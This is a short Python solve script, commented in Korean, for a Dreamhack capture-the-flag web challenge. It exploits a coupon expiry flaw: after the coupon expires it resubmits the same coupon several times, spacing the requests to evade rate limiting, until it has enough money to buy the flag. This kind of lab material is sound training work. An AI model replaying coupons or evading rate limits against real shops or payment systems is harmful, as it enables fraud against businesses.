import time
import requests

host = 'http://host8.dreamhack.games:18641/'

# 세션 발급
sessionurl = f'{host}/session'
r = requests.get(sessionurl)
session_data = r.json()
authorization = session_data['session']
print(f"세션: {authorization}")

# 쿠폰 발급
claimurl = f'{host}/coupon/claim'
header = {
    "Authorization": authorization
}
r = requests.get(claimurl, headers=header)
coupon_data = r.json()
coupon = coupon_data['coupon']
print(f"쿠폰: {coupon}")

# 쿠폰 제출
submiturl = f'{host}/coupon/submit'
header = {
    "Authorization": authorization,
    "coupon": coupon
}
r = requests.get(submiturl, headers=header)
status_data = r.json()
status = status_data['status']
print(f"첫 번째 요청: {status}")

# 쿠폰 만료 대기 (45초)
print("쿠폰 만료 대기 중...")
time.sleep(45)

# 쿠폰 재사용 (돈 복사)
for i in range(2, 5):
    r = requests.get(submiturl, headers=header)
    status_data = r.json()
    status = status_data['status']
    print(f"{i}번째 요청: {status}")
    time.sleep(10)  # Rate limit 회피

# 현재 돈 확인
moneyurl = f'{host}/me'
header = {
    "Authorization": authorization
}
r = requests.get(moneyurl, headers=header)
money_data = r.json()
money = money_data['money']
print(f"현재 돈: {money}")

# 플래그 구매
if money >= 2000:
    flagurl = f'{host}/flag/claim'
    header = {
        "Authorization": authorization
    }
    r = requests.get(flagurl, headers=header)
    flag_data = r.json()
    
    if flag_data['status'] == 'success':
        print(f"\n🎉 플래그 획득! 🎉")
        print(f"FLAG: {flag_data['message']}")
    else:
        print(f"플래그 구매 실패: {flag_data}")
else:
    print(f"돈이 부족합니다. 현재: {money}, 필요: 2000")